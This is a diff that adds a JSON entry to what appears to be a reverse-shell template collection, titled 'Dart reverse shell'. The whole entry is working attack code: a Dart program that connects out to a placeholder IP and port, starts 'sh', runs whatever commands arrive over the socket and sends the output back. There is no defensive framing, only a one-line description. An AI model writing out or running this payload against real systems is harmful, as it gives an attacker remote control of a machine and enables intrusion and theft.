@@ -1,0 +1,9 @@
+{
+  "commands": [
+    {
+      "title": "Dart reverse shell",
+      "template": "import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"{ip}\", {port}).then((socket) {\n    socket.listen((data) {\n      Process.start('sh', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}",
+      "description": "Dart reverse shell connecting to specified IP and port, piping shell input/output through socket."
+    }
+  ]
+}
